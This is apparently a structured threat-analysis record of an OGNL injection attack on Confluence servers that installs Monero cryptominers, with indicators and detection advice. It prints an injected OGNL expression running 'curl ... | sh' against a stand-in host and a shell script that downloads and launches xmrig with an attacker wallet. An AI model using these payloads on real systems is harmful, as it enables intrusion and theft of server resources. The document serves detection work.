package_info.package_versions: All versions prior to patched releases (e.g., < 7.13.0)
package_info.why_malicious: The vulnerability allows attackers to execute arbitrary OGNL expressions remotely, leading to full remote code execution. Attackers exploited this to deploy cryptomining malware (Monero miners) on compromised servers.

execution_context.file_location: HTTP request payload (OGNL expression injected into vulnerable Confluence endpoint)

malicious_snippets.code_snippet: OGNL expression injected via HTTP request, e.g.: ${(#a=@java.lang.Runtime@getRuntime().exec('curl http://malicious.site/miner.sh | sh'))}
malicious_snippets.code_behavior: At runtime, the injected OGNL expression executes a shell command that downloads and runs a remote cryptominer installation script, resulting in unauthorized cryptomining on the server.

malice_analysis.why_suspicious: Remote code execution via user-supplied OGNL expressions is highly abnormal and dangerous, especially when used to download and execute external scripts.
malice_analysis.violated_expectations: Normal Confluence operation should never allow arbitrary code execution from HTTP request parameters; this is a clear violation of application security boundaries.
malice_analysis.similar_legitimate_use: OGNL is used for legitimate server-side expression evaluation, but never with untrusted user input.
key_indicators: Chaining of curl/wget and shell execution

malicious_snippets.code_snippet:
#!/bin/sh
curl -O http://malicious.site/xmrig && chmod +x xmrig && ./xmrig --url pool.minexmr.com:4444 --user attacker_wallet
malicious_snippets.code_behavior: After initial exploitation, the script downloads a cryptominer binary, sets execution permissions, and launches it to mine Monero using the attacker's wallet and mining pool.

malice_analysis.why_suspicious: Automated download and execution of cryptomining software is a classic sign of post-exploitation malware activity.
malice_analysis.violated_expectations: Confluence servers should not download or run arbitrary binaries, especially cryptominers.
malice_analysis.similar_legitimate_use: Automated software installation scripts, but only from trusted sources and with user consent.
key_indicators: Download of xmrig or similar mining binaries
Execution of shell scripts from /tmp or other writable directories

attack_chain.action: Attacker sends a crafted HTTP request exploiting the OGNL injection vulnerability to achieve remote code execution.
attack_chain.leads_to: Allows attacker to execute arbitrary shell commands on the Confluence server.

attack_chain.action: Attacker downloads and executes a cryptomining installation script on the compromised server.
attack_chain.leads_to: Cryptominer runs on the server, using its resources to mine Monero for the attacker.

behavioral_signatures: Unexpected OGNL expressions in HTTP request parameters
Runtime.exec() or similar process execution from web application context
Outbound network connections to known cryptomining pools
Download and execution of binaries from untrusted external sources
file_indicators: xmrig or other cryptominer binaries in temporary or application directories
network_indicators: Connections to pool.minexmr.com or other public mining pools
Outbound HTTP requests to attacker-controlled domains (e.g., malicious.site)
detection_knowledge.how_to_detect: Monitor web server logs for OGNL expressions in request parameters, especially those invoking Runtime.exec(). Detect unexpected process creation (e.g., xmrig, miner.sh) by the Confluence application user. Monitor for outbound connections to known cryptomining pools and suspicious domains. Alert on downloads and execution of binaries from untrusted sources.
